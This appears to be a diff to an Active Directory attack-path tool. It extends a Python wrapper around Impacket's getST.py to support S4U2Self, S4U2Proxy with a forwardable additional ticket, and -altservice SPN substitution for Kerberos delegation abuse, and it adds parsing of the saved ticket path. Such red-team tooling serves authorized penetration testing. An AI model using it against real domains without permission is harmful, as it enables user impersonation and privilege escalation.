@@ -77,6 +77,10 @@ async def run_impacket_tool(
     cmd = get_faketime_prefix() + [tool_name, *args]
     logger.debug("Executing: %s", _redact_cmd(cmd))
 
+    from pathstrike.engine.command_emitter import placeholder_result, record_command
+    if record_command("impacket", cmd, redacted=_redact_cmd(cmd)):
+        return placeholder_result("impacket", cmd, subcommand=tool_name)
+
     result: dict[str, Any] = {
         "success": False,
         "output": "",
@@ -131,6 +135,19 @@ async def run_impacket_tool(
 # ---------------------------------------------------------------------------
 # Authentication argument builder
 # ---------------------------------------------------------------------------
+
+
+def parse_saved_ccache(result: dict) -> str | None:
+    """Return the ccache path getST.py reports (``Saving ticket in <file>``).
+
+    More robust than reconstructing the filename — Impacket includes the realm
+    and honours ``-altservice`` in the saved name, so guessing breaks.
+    """
+    import re
+
+    out = f"{result.get('output', '')}\n{result.get('stderr', '')}"
+    m = re.search(r"Saving ticket in (\S+\.ccache)", out)
+    return m.group(1) if m else None
 
 
 def build_impacket_auth(
@@ -277,11 +294,15 @@ async def get_st(
     nt_hash: str | None = None,
     dc_ip: str | None = None,
     timeout: int = 60,
+    additional_ticket: str | None = None,
+    altservice: str | None = None,
+    use_self: bool = False,
 ) -> dict[str, Any]:
     """Run ``getST.py`` to perform S4U2Self / S4U2Proxy and obtain a service ticket.
 
     Args:
         spn: Target service principal name (e.g. ``cifs/dc01.corp.local``).
+            May be empty when ``use_self`` is set (pure S4U2Self).
         impersonate: User to impersonate via S4U.
         auth_args: Pre-built auth flags.
         domain: AD domain.
@@ -290,20 +311,28 @@ async def get_st(
         nt_hash: NT hash (if applicable).
         dc_ip: DC IP address.
         timeout: Maximum seconds.
+        additional_ticket: Path to a forwardable TGS to feed into S4U2Proxy
+            (the RBCD-bridge / KCD-without-protocol-transition trick).
+        altservice: Substitute service in the resulting ticket (``-altservice``);
+            the SPN is not encrypted, so it can be swapped freely.
+        use_self: Pass ``-self`` to request an S4U2Self ticket to the requesting
+            account itself (used to stage a forwardable ticket).
 
     Returns:
         Result dict. On success, a ``.ccache`` file is written to the CWD.
     """
     target_str = build_target_string(domain, username, password, nt_hash)
 
-    args = [
-        target_str,
-        "-spn",
-        spn,
-        "-impersonate",
-        impersonate,
-        *auth_args,
-    ]
+    args = [target_str]
+    if use_self:
+        args.append("-self")
+    if spn:
+        args.extend(["-spn", spn])
+    args.extend(["-impersonate", impersonate, *auth_args])
+    if additional_ticket:
+        args.extend(["-additional-ticket", additional_ticket])
+    if altservice:
+        args.extend(["-altservice", altservice])
     if dc_ip:
         # Ensure dc-ip is present (may already be in auth_args)
         if "-dc-ip" not in auth_args:
